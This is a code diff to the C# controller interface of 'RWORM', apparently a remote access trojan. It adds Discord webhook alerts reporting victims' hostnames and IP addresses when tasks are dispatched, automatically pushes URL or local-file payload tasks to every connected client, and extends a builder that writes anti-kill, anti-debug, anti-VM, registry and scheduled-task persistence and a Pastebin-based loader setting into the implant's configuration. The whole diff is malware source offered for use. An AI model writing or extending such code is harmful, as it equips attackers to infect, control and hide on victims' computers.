@@ -45,6 +45,16 @@ namespace RWORM.GUI.ViewModels
         private bool   _buildTaskEnabled;
         private string _buildTaskUrl    = "";
 
+        // Tasks Discord Webhook options
+        private bool   _taskDiscordAlert = true;
+        private string _taskDiscordWebhook = "";
+        public bool    TaskDiscordAlert   { get => _taskDiscordAlert; set { _taskDiscordAlert = value; OnPropertyChanged(); } }
+        public string  TaskDiscordWebhook
+        {
+            get => !string.IsNullOrEmpty(_taskDiscordWebhook) ? _taskDiscordWebhook : _buildDiscordWebhook;
+            set { _taskDiscordWebhook = value; OnPropertyChanged(); }
+        }
+
         // Surveillance & Evasion builder options
         private bool   _buildAntiKill;
         private bool   _buildAntiSandbox;
@@ -148,6 +158,7 @@ namespace RWORM.GUI.ViewModels
         public ICommand AddUrlTaskCommand          { get; }
         public ICommand RunTaskOnSelectedCommand   { get; }
         public ICommand RemoveTaskCommand          { get; }
+        public ICommand TestTaskDiscordWebhookCommand { get; }
 
         internal ServerConnection Server => _server;
 
@@ -192,6 +203,7 @@ namespace RWORM.GUI.ViewModels
             SendQuickCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync());
 
             // Tasks
+            TestTaskDiscordWebhookCommand = new RelayCommand(async _ => await TestTaskDiscordWebhookAsync());
             AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
             AddUrlTaskCommand         = new RelayCommand(_ => AddUrlTask());
             RunTaskOnSelectedCommand  = new RelayCommand(_ => RunTaskOnSelected(),
@@ -500,6 +512,13 @@ namespace RWORM.GUI.ViewModels
             if (task.ExecutedGuids.Contains(client.Guid)) return;
             task.ExecutedGuids.Add(client.Guid);
 
+            _ = SendTaskDiscordAlertAsync(
+                "📋 Task Dispatched to Client",
+                $"Task **{task.Name}** was dispatched to **{client.Hostname}** (`{client.IpAddress}`).",
+                task.Name,
+                $"{client.Hostname} ({client.IpAddress})",
+                task.ModeLabel);
+
             try
             {
                 if (task.Mode == TaskMode.LocalFile)
@@ -543,6 +562,13 @@ namespace RWORM.GUI.ViewModels
             SelectedTask = task;
             StatusMessage = $"Task added: {task.Name}";
 
+            _ = SendTaskDiscordAlertAsync(
+                "📁 Local File Task Registered",
+                $"Task **{task.Name}** registered from local file: `{task.Source}`",
+                task.Name,
+                "Broadcast to connected clients",
+                task.ModeLabel);
+
             // Auto-run on currently connected clients immediately
             foreach (var client in Clients.ToList())
             {
@@ -564,6 +590,13 @@ namespace RWORM.GUI.ViewModels
             Tasks.Add(task);
             SelectedTask = task;
             StatusMessage = $"URL task added";
+
+            _ = SendTaskDiscordAlertAsync(
+                "🔗 URL Task Registered",
+                $"URL Task **{task.Name}** registered: `{task.Source}`",
+                task.Name,
+                "Broadcast to connected clients",
+                task.ModeLabel);
 
             // Auto-run on currently connected clients immediately
             foreach (var client in Clients.ToList())
@@ -596,6 +629,100 @@ namespace RWORM.GUI.ViewModels
             }
 
             StatusMessage = $"Task dispatched to {targets.Count} client(s)";
+        }
+
+        private async Task TestTaskDiscordWebhookAsync()
+        {
+            var url = TaskDiscordWebhook;
+            if (string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
+            {
+                System.Windows.MessageBox.Show("Please enter a valid Discord Webhook URL starting with http:// or https://", "Discord Webhook", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Warning);
+                return;
+            }
+
+            try
+            {
+                StatusMessage = "Sending Discord Webhook test...";
+                using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
+                var payload = new
+                {
+                    username = "RWORM Tasks Alert",
+                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
+                    embeds = new[]
+                    {
+                        new
+                        {
+                            title = "🔔 RWORM Discord Webhook Test",
+                            description = "Webhook alerts for Tasks and Clients are successfully connected and functioning!",
+                            color = 0x58A6FF,
+                            fields = new[]
+                            {
+                                new { name = "Status", value = "Online / Operational", inline = true },
+                                new { name = "Sender", value = Environment.MachineName, inline = true }
+                            },
+                            footer = new { text = "RWORM Task Notification System" },
+                            timestamp = DateTime.UtcNow.ToString("o")
+                        }
+                    }
+                };
+
+                var json = System.Text.Json.JsonSerializer.Serialize(payload);
+                using var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
+                var res = await client.PostAsync(url, content);
+                if (res.IsSuccessStatusCode)
+                {
+                    StatusMessage = "Discord Webhook test alert sent successfully!";
+                    System.Windows.MessageBox.Show("Test notification successfully delivered to Discord!", "Webhook Test Success", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
+                }
+                else
+                {
+                    StatusMessage = $"Webhook failed with status: {res.StatusCode}";
+                    System.Windows.MessageBox.Show($"Discord returned error: {res.StatusCode}", "Webhook Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
+                }
+            }
+            catch (Exception ex)
+            {
+                StatusMessage = "Discord Webhook test failed";
+                System.Windows.MessageBox.Show($"Failed to connect to Discord Webhook: {ex.Message}", "Webhook Error", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
+            }
+        }
+
+        public async Task SendTaskDiscordAlertAsync(string title, string description, string taskName, string targetClient, string mode)
+        {
+            var url = TaskDiscordWebhook;
+            if (!TaskDiscordAlert || string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
+                return;
+
+            try
+            {
+                using var client = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(6) };
+                var payload = new
+                {
+                    username = "RWORM Tasks Alert",
+                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
+                    embeds = new[]
+                    {
+                        new
+                        {
+                            title = title,
+                            description = description,
+                            color = 0x2ECC71, // Green
+                            fields = new[]
+                            {
+                                new { name = "Task", value = taskName, inline = true },
+                                new { name = "Target", value = targetClient, inline = true },
+                                new { name = "Type", value = mode, inline = true }
+                            },
+                            footer = new { text = "RWORM Task Dispatcher" },
+                            timestamp = DateTime.UtcNow.ToString("o")
+                        }
+                    }
+                };
+                var json = System.Text.Json.JsonSerializer.Serialize(payload);
+                using var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
+                await client.PostAsync(url, content).ConfigureAwait(false);
+            }
+            catch { }
         }
 
         // ── Send command ──────────────────────────────────────────────────────
@@ -860,6 +987,39 @@ namespace RWORM.GUI.ViewModels
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"TaskLoaderUrl\s*=\s*""[^""]*""",
                     $"TaskLoaderUrl = \"{BuildTaskUrl}\"");
+
+                // Anti-Kill & Evasion
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"AntiKill\s*=\s*(true|false)",
+                    $"AntiKill  = {BuildAntiKill.ToString().ToLower()}");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"AntiDebug\s*=\s*(true|false)",
+                    $"AntiDebug = {BuildAntiSandbox.ToString().ToLower()}");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"AntiVM\s*=\s*(true|false)",
+                    $"AntiVM    = {BuildAntiSandbox.ToString().ToLower()}");
+
+                // Discord Webhook Alerts
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"DiscordAlert\s*=\s*(true|false)",
+                    $"DiscordAlert   = {BuildDiscordAlert.ToString().ToLower()}");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"DiscordWebhook\s*=\s*""[^""]*""",
+                    $"DiscordWebhook = \"{BuildDiscordWebhook.Replace("\"", "\\\"")}\"");
+
+                // Persistence & Pastebin
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"StartupRegistry\s*=\s*(true|false)",
+                    $"StartupRegistry = {BuildStartupRegistry.ToString().ToLower()}");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"SchTasks\s*=\s*(true|false)",
+                    $"SchTasks        = {BuildSchTasks.ToString().ToLower()}");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"StartupPath\s*=\s*@""[^""]*""",
+                    $"StartupPath     = @\"{BuildStartupPath.Replace("\"", "\"\"")}\"");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"PastebinRaw\s*=\s*""[^""]*""",
+                    $"PastebinRaw     = \"{BuildPastebinRaw.Replace("\"", "\\\"")}\"");
 
                 System.IO.File.WriteAllText(clientConfigPath, cfg);
 
